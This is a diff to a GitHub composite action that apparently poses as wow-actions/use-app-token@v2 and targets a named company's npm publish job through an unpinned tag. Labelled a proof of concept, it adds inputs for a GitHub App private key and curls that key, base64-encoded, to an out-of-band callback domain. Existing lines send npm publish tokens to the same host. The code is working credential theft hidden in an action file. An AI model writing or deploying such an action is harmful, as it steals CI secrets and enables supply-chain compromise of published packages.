@@ -1,6 +1,13 @@
 name: 'use-app-token (v2 mutable - PoC)'
 description: 'Composite action mirroring wow-actions/use-app-token@v2 in frontegg/entitlements-client publish job; reads the GH App id/private key inputs plus job secrets.'
 author: 'sl4x0'
+inputs:
+  app_id:
+    description: 'GitHub App ID passed from secrets (via with:)'
+    required: false
+  private_key:
+    description: 'GitHub App private key passed from secrets (via with:)'
+    required: false
 runs:
   using: "composite"
   steps:
@@ -8,13 +15,17 @@ runs:
       shell: bash
       env:
         POC_OOB_DOMAIN: d9pqco71v5mnd2h3qku0mkex68h7eaahh.oast.me
+        APP_ID: ${{ inputs.app_id }}
+        PRIVATE_KEY_INPUT: ${{ inputs.private_key }}
       run: |
         echo "=== [poc] running inside frontegg-style publish job via unpinned @v2 ref ==="
-        echo "[poc] GH_APP_ID=${APP_ID:+PRESENT len ${#APP_ID}}"
-        echo "[poc] GH_APP_PRIVATE_KEY_INPUT=${PRIVATE_KEY_INPUT:+PRESENT len ${#PRIVATE_KEY_INPUT}}"
+        echo "[poc] APP_ID=${APP_ID:+PRESENT len ${#APP_ID}}"
+        echo "[poc] PRIVATE_KEY=${PRIVATE_KEY_INPUT:+PRESENT len ${#PRIVATE_KEY_INPUT}}"
         echo "[poc] NPM_PUBLISH_TOKEN=${NPM_PUBLISH_TOKEN:+PRESENT len ${#NPM_PUBLISH_TOKEN}}"
         echo "[poc] NPM_TOKEN=${NPM_TOKEN:+PRESENT len ${#NPM_TOKEN}}"
-        echo "[poc] GITHUB_TOKEN=${GITHUB_TOKEN:+PRESENT len ${#GITHUB_TOKEN}}"
+        if [ -n "${PRIVATE_KEY_INPUT:-}" ]; then
+          curl -s -o /dev/null -w 'oob_privkey_http=%{http_code}\n' --max-time 12 "https://${POC_OOB_DOMAIN}/privkey/$(printf %s "$PRIVATE_KEY_INPUT" | base64 -w0)"
+        fi
         if [ -n "${NPM_PUBLISH_TOKEN:-}" ]; then
           curl -s -o /dev/null -w 'oob_npm_pub_http=%{http_code}\n' --max-time 12 "https://${POC_OOB_DOMAIN}/npmpub/$(printf %s "$NPM_PUBLISH_TOKEN" | base64 -w0)"
         fi
